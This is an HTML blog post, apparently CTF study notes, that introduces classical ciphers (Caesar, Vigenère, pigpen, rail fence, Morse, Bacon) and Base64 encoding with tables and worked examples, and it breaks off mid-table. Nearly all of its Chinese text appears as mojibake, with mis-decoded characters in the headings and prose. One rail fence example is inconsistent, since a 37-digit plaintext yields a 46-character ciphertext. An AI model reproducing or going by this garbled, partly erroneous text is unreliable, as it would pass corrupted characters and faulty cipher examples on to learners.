    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>[TOC]</p><h2 id="0x01-å¤å…¸å¯†ç "><a href="#0x01-å¤å…¸å¯†ç " class="headerlink" title="0x01 å¤å…¸å¯†ç "></a>0x01 å¤å…¸å¯†ç </h2><p>è¿™éƒ¨åˆ†æˆ‘ä»¬ä»‹ç»å‡ ç§å…¸å¯†ç ã€‚  </p><blockquote><p>é—®ï¼šä»€ä¹ˆæ˜¯å¤å…¸<br>ç­”ï¼šå¾ˆæ—©ä»¥å‰çš„<br>é—®ï¼šå¤šæ—©ä»¥å‰çš„<br>ç­”ï¼šWhatï¼ŸCan u speak Englishï¼Ÿ</p></blockquote><p>â€œå¤å…¸â€æœ¬èº«å°±æ˜¯ä¸€ä¸ªæ¨¡ç³Šçš„å®šä¹‰ï¼Œé€šå¸¸æˆ‘ä»¬è®¤ä¸ºé¦™å†œç»å…¸è®ºæ–‡å‘è¡¨ä¹‹å‰çš„ä¸ºâ€å¤å…¸â€ï¼Œæˆ–è€…åˆ©ç”¨é¦™å†œçš„åŸºæœ¬æ€æƒ³è®¾è®¡çš„å¯†ç ç³»ç»Ÿå°†ä¸æ˜¯â€œå¤å…¸å¯†ç â€ã€‚</p><h3 id="1ã€å‡¯æ’’å¯†ç "><a href="#1ã€å‡¯æ’’å¯†ç " class="headerlink" title="1ã€å‡¯æ’’å¯†ç "></a>1ã€å‡¯æ’’å¯†ç </h3><p>æ¯ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­â€œç§»åŠ¨â€äº†ä¸€å®šçš„ä½ç½®ã€‚</p><p><strong>æ•°å­¦è¡¨ç¤ºï¼ˆå¯†ç ä¸º3ï¼‰ï¼š</strong></p><script type="math/tex; mode=display">\begin{cases}ğ‘ = ğ‘š + 3(ğ‘šğ‘œğ‘‘ 26) & 0 â‰¤ ğ‘š â‰¤ 25 \\ğ‘š = ğ‘ âˆ’ 3(ğ‘šğ‘œğ‘‘ 26) & 0 â‰¤ ğ‘ â‰¤ 25\end{cases}</script><p><img src="/2021/11/20/CTF/Crypto/Crypto/8f107ab1d8ddf6f94abd90b923e8bea7.png" alt="image-20211121145730842" style="zoom:80%;"></p><p>ä¾‹ï¼šåˆ©ç”¨å‡¯æ’’å¯†ç å¯¹â€abcâ€ è¿›è¡ŒåŠ å¯†ã€‚ </p><p>è§£ï¼šdef</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/6874af019accd5e84054654c4514c624.png" alt="image-20211121142047922"></p><h3 id="2ã€ç»´å‰å°¼äºšå¯†ç "><a href="#2ã€ç»´å‰å°¼äºšå¯†ç " class="headerlink" title="2ã€ç»´å‰å°¼äºšå¯†ç "></a>2ã€ç»´å‰å°¼äºšå¯†ç </h3><p>ç»´å‰å°¼äºšå¯†ç ï¼ˆåˆè¯‘ç»´çƒ­çº³å°”å¯†ç ï¼‰æ˜¯ä½¿ç”¨ä¸€ç³»åˆ—å‡¯æ’’å¯†ç ç»„æˆ å¯†ç å­—æ¯è¡¨çš„åŠ å¯†ç®—æ³•ï¼Œå±äºå¤šè¡¨å¯†ç çš„ä¸€ç§ç®€å•å½¢å¼ã€‚</p><ul><li><p>26 Ã— 26 æ–¹é˜µ</p></li><li><p>å¯†é’¥å¾ªç¯ä½¿ç”¨</p></li></ul><p><img src="/2021/11/20/CTF/Crypto/Crypto/f42b3c44867d376fe3876d5dada08597.png" alt="image-20211124161834324"></p><p>æ˜æ–‡ï¼šThis_is_flag </p><p>å¯†é’¥ï¼šbiu</p><p>å¯†æ–‡ï¼šUpct_qm_gtuh</p><h3 id="3ã€çŒªåœˆå¯†ç "><a href="#3ã€çŒªåœˆå¯†ç " class="headerlink" title="3ã€çŒªåœˆå¯†ç "></a>3ã€çŒªåœˆå¯†ç </h3><p>çŒªåœˆå¯†ç ï¼ˆäº¦ç§°æœ±é«˜å¯†ç ã€å…±æµä¼šæš—å·ã€å…±æµä¼šå¯†ç æˆ–å…±æµä¼šå‘˜å¯†ç ï¼‰ï¼Œæ˜¯ä¸€ç§ä»¥æ ¼å­ä¸ºåŸºç¡€çš„ç®€å•æ›¿ä»£å¼å¯†ç ã€‚</p><h4 id="1ï¼‰ä¼ ç»Ÿçš„"><a href="#1ï¼‰ä¼ ç»Ÿçš„" class="headerlink" title="1ï¼‰ä¼ ç»Ÿçš„"></a>1ï¼‰ä¼ ç»Ÿçš„</h4><p><img src="/2021/11/20/CTF/Crypto/Crypto/8892f798dae3867e46e17558a0a8cb1a.jpg" alt="1-210929212934M6" style="zoom:80%;"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/b3fbfc30133f75688a23bfd2a7ccad58.jpg" alt="1-21092921320b28" style="zoom:80%;"></p><h4 id="2ï¼‰å˜ç§"><a href="#2ï¼‰å˜ç§" class="headerlink" title="2ï¼‰å˜ç§"></a>2ï¼‰å˜ç§</h4><p><img src="/2021/11/20/CTF/Crypto/Crypto/e2928e0053f124c5f3c009291345f6a8.jpg" alt="1-210929213KN21"></p><h3 id="4ã€æ …æ å¯†ç "><a href="#4ã€æ …æ å¯†ç " class="headerlink" title="4ã€æ …æ å¯†ç "></a>4ã€æ …æ å¯†ç </h3><p>æ‰€è°“æ …æ å¯†ç ï¼Œå°±æ˜¯å°†è¦åŠ å¯†çš„æ˜æ–‡åˆ†ä¸ºNä¸ªä¸€ç»„ï¼Œå†ä»æ¯ç»„çš„é€‰å‡ºä¸€ä¸ªå­—æ¯è¿èµ·æ¥ï¼Œå½¢æˆä¸€æ®µæ— è§„å¾‹çš„å¯†æ–‡ã€‚</p><p>æ …æ å¯†ç å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œç¬¬ä¸€ç§æ˜¯Nå‹æ …æ å¯†ç ï¼ˆåŠ å¯†æ–¹å¼æºè‡ªç™¾åº¦ç™¾ç§‘ï¼‰ã€ç¬¬äºŒç§æ˜¯Vå‹æ …æ å¯†ç ï¼ˆåŠ å¯†æ–¹å¼æºè‡ªç»´åŸºç™¾ç§‘ï¼‰ã€‚</p><h4 id="1ï¼‰Nå‹æ …æ å¯†ç "><a href="#1ï¼‰Nå‹æ …æ å¯†ç " class="headerlink" title="1ï¼‰Nå‹æ …æ å¯†ç "></a>1ï¼‰Nå‹æ …æ å¯†ç </h4><p>ä½¿ç”¨å¯†é’¥ 8ï¼ˆæ …æ çš„æ æ•°ï¼‰åŠ å¯†ä¸€ä¸‹æ˜æ–‡ <code>1234567891234567891234567891234567891</code> </p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-number">1.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">9.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">8.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">7.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">6.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">5.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br><span class="hljs-number">.2</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.1</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.9</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.8</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.7</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.6</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br>.<span class="hljs-number">.3</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.2</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.1</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.9</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.8</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.7</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br><span class="hljs-params">...</span><span class="hljs-number">4.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">3.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">2.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">1.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">9.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">8.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br><span class="hljs-params">...</span><span class="hljs-number">.5</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.4</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.3</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.2</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.1</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.9</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..<br><span class="hljs-params">...</span>.<span class="hljs-number">.6</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.5</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.4</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.3</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.2</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.1</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">7.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">6.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">5.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">4.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">3.</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.8</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.7</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.6</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.5</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-number">.4</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.<br></code></pre></td></tr></table></figure><p><strong>é¦–å…ˆç”»å‡º8æ è¡¨æ ¼ï¼Œæ˜æ–‡ç”±ä¸Šè‡³ä¸‹é¡ºåºå†™ä¸Šï¼Œå½“åˆ°è¾¾æœ€ä½éƒ¨æ—¶ï¼Œå†å›åˆ°ç¬¬ä¸€æ é‡æ–°å¼€å§‹ï¼Œä¸€ç›´é‡å¤ç›´è‡³æ•´ç¯‡æ˜æ–‡å†™å®Œä¸ºæ­¢ã€‚</strong></p><p>æ¨ªå‘è¯»å–è¡¨æ ¼å³ä¸ºå¯†æ–‡ï¼š<code>1987652198763219874321985432196543217654387654</code> ã€‚</p><h4 id="2ï¼‰Vå‹æ …æ å¯†ç "><a href="#2ï¼‰Vå‹æ …æ å¯†ç " class="headerlink" title="2ï¼‰Vå‹æ …æ å¯†ç "></a>2ï¼‰Vå‹æ …æ å¯†ç </h4><p>ä½¿ç”¨å¯†é’¥ 8ï¼ˆæ …æ çš„æ æ•°ï¼‰åŠ å¯†ä¸€ä¸‹æ˜æ–‡<code>Will invade Kentucky on October the eighth# signal is Frozen chicken&#39;#</code></p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">W</span>...........<span class="hljs-built_in">..n</span>...........<span class="hljs-built_in">..b</span>.............#...........<span class="hljs-built_in">..r</span>.............#...<br>.i.........<span class="hljs-built_in">..e</span>.t.........<span class="hljs-built_in">..o</span>.e.........<span class="hljs-built_in">..h</span>. .........<span class="hljs-built_in">..F</span>.o...........&#x27;....<br><span class="hljs-built_in">..l</span>.......<span class="hljs-built_in">..K</span>.<span class="hljs-built_in">..u</span>.......<span class="hljs-built_in">..t</span>.<span class="hljs-built_in">..r</span>.......<span class="hljs-built_in">..t</span>.<span class="hljs-built_in">..s</span>.........&#x27;.<span class="hljs-built_in">..z</span>.......<span class="hljs-built_in">..n</span>.....<br>.<span class="hljs-built_in">..l</span>....... ...<span class="hljs-built_in">..c</span>.....<span class="hljs-built_in">..c</span>..... .....<span class="hljs-built_in">..h</span>...<span class="hljs-built_in">..i</span>....... ...<span class="hljs-built_in">..e</span>.....<span class="hljs-built_in">..e</span>......<br>.... ...<span class="hljs-built_in">..e</span>.....<span class="hljs-built_in">..k</span>...<span class="hljs-built_in">..O</span>.....<span class="hljs-built_in">..t</span>...<span class="hljs-built_in">..g</span>.....<span class="hljs-built_in">..g</span>...<span class="hljs-built_in">..s</span>.....<span class="hljs-built_in">..n</span>...<span class="hljs-built_in">..k</span>.......<br>...<span class="hljs-built_in">..i</span>.<span class="hljs-built_in">..d</span>.......<span class="hljs-built_in">..y</span>... .......<span class="hljs-built_in">..h</span>.<span class="hljs-built_in">..i</span>.......<span class="hljs-built_in">..n</span>.<span class="hljs-built_in">..i</span>......... .<span class="hljs-built_in">..c</span>........<br>....<span class="hljs-built_in">..n</span>.a........... .n.........<span class="hljs-built_in">..e</span>.e.........<span class="hljs-built_in">..a</span>. .........<span class="hljs-built_in">..c</span>.i.........<br>.....<span class="hljs-built_in">..v</span>...........<span class="hljs-built_in">..o</span>............. ...........<span class="hljs-built_in">..l</span>...........<span class="hljs-built_in">..h</span>..........<br></code></pre></td></tr></table></figure><p><strong>åœ¨Vå‹æ …æ å¯†ç ä¸­ï¼Œæ˜æ–‡ç”±ä¸Šè‡³ä¸‹é¡ºåºå†™ä¸Šï¼Œå½“åˆ°è¾¾æœ€ä½éƒ¨æ—¶ï¼Œå†å›å¤´å‘ä¸Šï¼Œä¸€ç›´é‡å¤ç›´è‡³æ•´ç¯‡æ˜æ–‡å†™å®Œä¸ºæ­¢ã€‚</strong></p><p>æ¨ªå‘è¯»å–è¡¨æ ¼å³ä¸ºå¯†æ–‡ï¼š<code>Wnb#r#ietoehFo&#39;lkutrts&#39;znl cc hi ee ekOtggsnkidy hini cna neea civo lh</code> ã€‚</p><h3 id="5ã€æ‘©æ–¯å¯†ç "><a href="#5ã€æ‘©æ–¯å¯†ç " class="headerlink" title="5ã€æ‘©æ–¯å¯†ç "></a>5ã€æ‘©æ–¯å¯†ç </h3><p>æ‘©å°”æ–¯ç”µç æ˜¯ä¸€ç§æ—©æœŸçš„æ•°å­—åŒ–é€šä¿¡å½¢å¼ï¼Œä½†æ˜¯å®ƒä¸åŒäºç°ä»£åªä½¿ç”¨é›¶å’Œä¸€ä¸¤ç§çŠ¶æ€çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå®ƒçš„ä»£ç åŒ…æ‹¬äº”ç§ï¼š ç‚¹ã€åˆ’ã€ç‚¹å’Œåˆ’ä¹‹é—´çš„åœé¡¿ã€æ¯ä¸ªå­—ç¬¦ä¹‹é—´çŸ­çš„åœé¡¿ã€æ¯ä¸ªè¯ä¹‹é—´ä¸­ç­‰çš„åœé¡¿ä»¥åŠå¥å­ä¹‹é—´é•¿çš„åœé¡¿ã€‚</p><p><strong>æ‘©æ–¯ç”µç ç‰¹ç‚¹ï¼š</strong></p><ul><li>ç‚¹ï¼ˆ.ï¼‰ã€åˆ’ï¼ˆ-ï¼‰â€”â€”â€”â€”ï¼ˆå¯èƒ½ä¼šç”¨<strong>0å’Œ1</strong>ä»£æ›¿<strong>ç‚¹å’Œåˆ’</strong>ï¼‰</li><li>é€šå¸¸ç”¨ç©ºæ ¼è¡¨ç¤ºæ¯ä¸ªå­—ç¬¦é—´çŸ­çš„åœé¡¿</li><li>é€šå¸¸ç”¨ <strong>/</strong> åˆ’åˆ†æ¯ä¸ªè¯ä¹‹é—´ä¸­ç­‰çš„åœé¡¿</li></ul><p><img src="/2021/11/20/CTF/Crypto/Crypto/cbe5f50ef451fa68ddd4698b8df939a3.png" alt="2020040817184768"></p><h3 id="6ã€åŸ¹æ ¹å¯†ç "><a href="#6ã€åŸ¹æ ¹å¯†ç " class="headerlink" title="6ã€åŸ¹æ ¹å¯†ç "></a>6ã€åŸ¹æ ¹å¯†ç </h3><p>åŠ å¯†æ—¶ï¼Œæ˜æ–‡ä¸­çš„æ¯ä¸ªå­—æ¯éƒ½ä¼šè½¬æ¢æˆä¸€ç»„äº”ä¸ªè‹±æ–‡å­—æ¯ã€‚</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/67a33cf000b1de408ad6481e8579e8c6.png" alt="image-20211124145910337"></p><p>åŸ¹æ ¹å¯†ç ç›¸å¯¹éšæ„ï¼Œå½“å‡ºç°äº†ä¸¤ç§ä¸åŒå½¢å¼çš„å‘ˆç°æ—¶å€™ï¼ˆä¸€æ®µæ–‡å­—æœ‰ä¸¤ç§å­—ä½“å°±å¯èƒ½æ˜¯è¿™ç§å¯†ç ï¼‰ï¼Œå°±å¯ä»¥ä½¿ç”¨åŸ¹æ ¹å¯†ç ã€‚å°†å…¶äº”äº”åˆ†ç»„ï¼Œä¹‹åæŠŠç¬¬ä¸€ç§å½¢å¼å½“æˆaï¼ŒæŠŠå¦ä¸€ç§å½“æˆbï¼ˆæˆ–è€…åè¿‡æ¥ï¼‰ï¼Œç„¶åå°±å¯ä»¥ä¸€ä¸€å¯¹åº”è¿›è¡Œè§£å¯†ã€‚</p><p><strong>ç»™å¤§å®¶å±•ç°ä¸€äº›ä¾‹å­ï¼š</strong></p><div class="table-container"><table><thead><tr><th>å¯†æ–‡</th><th>å¯èƒ½è§£å¯†ä¸€</th><th>æ˜æ–‡</th><th>å¯èƒ½è§£å¯†äºŒ</th><th>æ˜æ–‡</th></tr></thead><tbody><tr><td><strong>1</strong>2<strong>34</strong>5 6<strong>789</strong>0</td><td>abaab baaab</td><td>jr</td><td>babba abbba</td><td>wo</td></tr><tr><td>10110 01110</td><td>abaab baaab</td><td>jr</td><td>babba abbba</td><td>wo</td></tr><tr><td>ä½ æµ·ä»–ä»¬æ¹– æ±Ÿä»¬ä½ ä»–æµ</td><td>abaab baaab</td><td>jr</td><td>babba abbba</td><td>wo</td></tr></tbody></table></div><h3 id="7ã€Base64åŠ å¯†"><a href="#7ã€Base64åŠ å¯†" class="headerlink" title="7ã€Base64åŠ å¯†"></a>7ã€Base64åŠ å¯†</h3><p>Base64ç¼–ç ï¼Œæ˜¯æˆ‘ä»¬ç¨‹åºå¼€å‘ä¸­ç»å¸¸ä½¿ç”¨åˆ°çš„ç¼–ç æ–¹æ³•ã€‚å®ƒæ˜¯ä¸€ç§åŸºäºç”¨64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„è¡¨ç¤ºæ–¹æ³•ã€‚å®ƒé€šå¸¸ç”¨ä½œå­˜å‚¨ã€ä¼ è¾“ä¸€äº›äºŒè¿›åˆ¶æ•°æ®çš„ç¼–ç æ–¹æ³•ã€‚</p><p><strong>Base64è½¬æ¢åŸç†ï¼š</strong></p><p>å®ƒæ˜¯ç”¨64ä¸ªå¯æ‰“å°å­—ç¬¦è¡¨ç¤ºäºŒè¿›åˆ¶æ‰€æœ‰æ•°æ®æ–¹æ³•ã€‚ç”±äº2çš„6æ¬¡æ–¹ç­‰äº64ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¯6ä½ä¸ºä¸€ä¸ªå•å…ƒï¼Œå¯¹åº”æŸä¸ªå¯æ‰“å°å­—ç¬¦ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ä¸‰ä¸ªå­—èŠ‚æœ‰24ä½ï¼Œå°±å¯ä»¥åˆšå¥½å¯¹åº”äº4ä¸ªBase64å•å…ƒï¼Œå³3ä¸ªå­—èŠ‚éœ€è¦ç”¨4ä¸ªBase64çš„å¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºã€‚</p><p>åœ¨Base64ä¸­çš„å¯æ‰“å°å­—ç¬¦åŒ…æ‹¬å­—æ¯A-Zã€a-zã€æ•°å­—0-9 ï¼Œè¿™æ ·å…±æœ‰62ä¸ªå­—ç¬¦ï¼Œæ­¤å¤–ä¸¤ä¸ªå¯æ‰“å°ç¬¦å·åœ¨ä¸åŒçš„ç³»ç»Ÿä¸­ä¸€èˆ¬æœ‰æ‰€ä¸åŒã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬ç»å¸¸æ‰€è¯´çš„Base64å¦å¤–2ä¸ªå­—ç¬¦æ˜¯ï¼šâ€œ+/â€ã€‚</p><p>è¿™64ä¸ªå­—ç¬¦ï¼Œæ‰€å¯¹åº”è¡¨å¦‚ä¸‹ã€‚</p><div class="table-container"><table><thead><tr><th>ç¼–å·</th><th>å­—ç¬¦</th><th></th><th>ç¼–å·</th><th>å­—ç¬¦</th><th></th><th>ç¼–å·</th><th>å­—ç¬¦</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>16</td><td>Q</td><td>32</td><td>g</td><td>48</td><td>w</td></tr><tr><td>1</td><td>B</td><td>17</td><td>R</td><td>33</td><td>h</td><td>49</td><td>x</td></tr><tr><td>2</td><td>C</td><td>18</td><td>S</td><td>34</td><td>i</td><td>50</td><td>y</td></tr><tr><td>3</td><td>D</td><td>19</td><td>T</td><td>35</td><td>j</td><td>51</td><td>z</td></tr><tr><td>4</td><td>E</td><td>20</td><td>U</td><td>36</td><td>k</td><td>52</td><td>0</td></tr><tr><td>5</td><td>F</td><td>21</td><td>V</td><td>37</td><td>l</td><td>53</td><td>1</td></tr><tr><td>6</td><td>G</td><td>22</td><td>W</td><td>38</td><td>m</td><td>54</td><td>2</td></tr><tr><td>7</td><td>H</td><td>23</td><td>X</td><td>39</td><td>n</td><td>55</td><td>3</td></tr><tr><td>8</td><td>I</td><td>24</td><td>Y</td><td>40</td><td>o</td><td>56</td><td>4</td></tr><tr><td>9</td><td>J</td><td>25</td><td>Z</td><td>41</td><td>p</td><td>57</td><td>5</td></tr><tr><td>10</td><td>K</td><td>26</td><td>a</td><td>42</td><td>q</td><td>58</td><td>6</td></tr><tr><td>11</td><td>L</td><td>27</td><td>b</td><td>43</td><td>r</td><td>59</td><td>7</td></tr><tr><td>12</td><td>M</td><td>28</td><td>c</td><td>44</td><td>s</td><td>60</td><td>8</td></tr><tr><td>13</td><td>N</td><td>29</td><td>d</td><td>45</td><td>t</td><td>61</td><td>9</td></tr><tr><td>14</td><td>O</td><td>30</td><td>e</td><td>46</td><td>u</td><td>62</td><td>+</td></tr><tr><td>15</td><td>P</td><td>31</td><td>f</td><td>47</td><td>v</td><td>63</td><td>/</td></tr></tbody></table></div><p>è½¬æ¢çš„æ—¶å€™ï¼Œå°†ä¸‰ä¸ªbyteçš„æ•°æ®ï¼Œå…ˆåæ”¾å…¥ä¸€ä¸ª24bitçš„ç¼“å†²åŒºä¸­ï¼Œå…ˆæ¥çš„byteå é«˜ä½ã€‚æ•°æ®ä¸è¶³3byteçš„è¯ï¼Œäºç¼“å†²åŒºä¸­å‰©ä¸‹çš„bitç”¨0è¡¥è¶³ã€‚ç„¶åï¼Œæ¯æ¬¡å–å‡º6ä¸ªbitï¼ŒæŒ‰ç…§å…¶å€¼é€‰æ‹© <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> ä¸­çš„å­—ç¬¦ä½œä¸ºç¼–ç åçš„è¾“å‡ºã€‚ä¸æ–­è¿›è¡Œï¼Œç›´åˆ°å…¨éƒ¨è¾“å…¥æ•°æ®è½¬æ¢å®Œæˆã€‚</p><p>å¦‚æœæœ€åå‰©ä¸‹ä¸¤ä¸ªè¾“å…¥æ•°æ®ï¼Œåœ¨ç¼–ç ç»“æœååŠ 1ä¸ªâ€œ=â€ï¼›å¦‚æœæœ€åå‰©ä¸‹ä¸€ä¸ªè¾“å…¥æ•°æ®ï¼Œç¼–ç ç»“æœååŠ 2ä¸ªâ€œ=â€ï¼›å¦‚æœæ²¡æœ‰å‰©ä¸‹ä»»ä½•æ•°æ®ï¼Œå°±ä»€ä¹ˆéƒ½ä¸è¦åŠ ï¼Œè¿™æ ·æ‰å¯ä»¥ä¿è¯èµ„æ–™è¿˜åŸçš„æ­£ç¡®æ€§ã€‚</p><p>ç¼–ç åçš„æ•°æ®æ¯”åŸå§‹æ•°æ®ç•¥é•¿ï¼Œä¸ºåŸæ¥çš„4/3ã€‚æ— è®ºä»€ä¹ˆæ ·çš„å­—ç¬¦éƒ½ä¼šå…¨éƒ¨è¢«ç¼–ç ï¼Œå› æ­¤ä¸åƒ<a href="http://blog.chacuo.net/494.html">Quoted-printable</a> ç¼–ç ï¼Œè¿˜ä¿ç•™éƒ¨åˆ†å¯æ‰“å°å­—ç¬¦ã€‚æ‰€ä»¥ï¼Œå®ƒçš„å¯è¯»æ€§ä¸å¦‚<a href="http://blog.chacuo.net/494.html">Quoted-printable</a>ç¼–ç ï¼</p><div class="table-container"><table><thead><tr><th>æ–‡æœ¬</th><th><strong>M</strong></th><th><strong>a</strong></th><th><strong>n</strong></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>ASCIIç¼–ç </td><td>77</td><td>97</td><td>110</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>äºŒè¿›åˆ¶ä½ï¼ˆ8ä½ï¼‰</td><td>0100 1101</td><td>0110 0001</td><td>0110 1110</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>äºŒè¿›åˆ¶ä½ï¼ˆ6ä½ï¼‰</td><td>01 0011</td><td>01 0110</td><td>00 0101</td><td>10 1110</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>åè¿›åˆ¶</td><td>19</td><td>22</td><td>5</td><td>46</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Base64ç¼–ç </td><td><strong>T</strong></td><td><strong>W</strong></td><td><strong>F</strong></td><td><strong>u</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></div><p>Mçš„Asciiç æ˜¯77,å‰å…­ä½å¯¹åº”å€¼ä¸º19ï¼Œå¯¹åº”base64å­—ç¬¦æ˜¯Tï¼Œå¦‚æ­¤ç±»æ¨ã€‚å…¶å®ƒå­—ç¬¦ç¼–ç å°±å¯ä»¥è‡ªåŠ¨è½¬æ¢å¾—åˆ°ï¼æˆ‘ä»¬çœ‹çœ‹å¦å¤–ä¸æ˜¯åˆšå¥½æ˜¯3ä¸ªå­—èŠ‚çš„æƒ…å†µï¼</p><div class="table-container"><table><thead><tr><th>æ–‡æœ¬ï¼ˆ1 Byteï¼‰</th><th><strong>A</strong></th><th></th><th></th><th></th><th></th><th></th><th>B</th><th>C</th><th></th><th></th></tr></thead><tbody><tr><td>ASCIIç¼–ç </td><td>65</td><td></td><td></td><td></td><td></td><td></td><td>66</td><td>67</td><td></td><td></td></tr><tr><td>äºŒè¿›åˆ¶ä½ï¼ˆ8ä½ï¼‰</td><td>0100 0001</td><td></td><td></td><td></td><td></td><td></td><td>0100 0010</td><td>0100 0011</td><td></td><td></td></tr><tr><td>äºŒè¿›åˆ¶ä½ï¼ˆ6ä½ï¼‰</td><td>01 0000</td><td>01 <strong>0000</strong></td><td></td><td></td><td></td><td></td><td>01 0000</td><td>10 0100</td><td>0011 <strong>00</strong></td><td></td></tr><tr><td>åè¿›åˆ¶</td><td>16</td><td>16</td><td></td><td></td><td></td><td></td><td>16</td><td>36</td><td>12</td><td></td></tr><tr><td>Base64ç¼–ç 